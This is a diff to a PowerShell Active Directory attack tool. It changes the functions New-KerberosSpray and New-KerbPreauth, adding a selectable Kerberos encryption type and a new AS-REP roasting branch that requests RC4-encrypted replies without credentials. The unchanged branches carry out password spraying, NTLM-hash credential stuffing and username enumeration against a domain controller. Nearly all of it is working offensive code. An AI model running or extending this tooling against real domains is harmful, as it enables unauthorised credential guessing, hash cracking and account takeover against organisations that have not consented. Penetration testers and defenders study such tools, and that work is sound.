@@ -356,15 +356,22 @@ function Local:New-KerberosSpray {
         }
         elseif ($cred.Password) {
             # Kerberos preauthentication using plain-text password (spraying)
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -Domain $Domain -Server $Server
+            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
+            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -EncType 18 -Domain $Domain -Server $Server
         }
         elseif ($cred.Hash) {
-            # Kerberos preauthentication using NTLM hash (stuffing)
+            # Kerberos preauthentication using NTLM hash / RC4 key (stuffing)
             $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Hash $cred.Hash -Domain $Domain -Server $Server
+        }
+        elseif ($Ldap) {
+            # Kerberos preauthentication without credentials (roasting)
+            # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
+            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 23 -Domain $Domain -Server $Server
         }
         else {
             # Kerberos preauthentication without credentials (enumeration)
-            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Domain $Domain -Server $Server
+            # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
+            $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -EncType 18 -Domain $Domain -Server $Server
         }
         $tag = $asn_AS_REP.TagValue
 
@@ -526,6 +533,11 @@ function Local:New-KerbPreauth {
         [String]
         $Hash,
 
+        [Parameter(Mandatory = $False)]
+        [ValidateSet(1, 3, 17, 18, 23, 24)]
+        [Int]
+        $EncType = 18,
+
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
@@ -543,10 +555,9 @@ function Local:New-KerbPreauth {
     $Socket.TTL = 128
 
     if ($Password) {
-        # KERB_ETYPE 18 = AES256-CTS-HMAC-SHA1-96
         $salt = "$($Domain.ToUpper())$($Username)"
-        $keyBytes = KerberosPasswordHash -eType 18 -Password $Password -Salt $salt -Count 4096
-        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 18 -Key $keyBytes
+        $keyBytes = KerberosPasswordHash -eType $EncType -Password $Password -Salt $salt -Count 4096
+        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType -Key $keyBytes
     }
     elseif ($Hash) {
         # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
@@ -554,8 +565,7 @@ function Local:New-KerbPreauth {
         $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 23 -Key $ntlmHashBytes
     }
     else {
-        # KERB_ETYPE 23 = ARCFOUR-HMAC-MD5
-        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType 23
+        $ASREQ = New-ASReq -UserName $Username -Domain $Domain -EncType $EncType
     }
 
     $LengthBytes = [System.BitConverter]::GetBytes($ASREQ.Length)
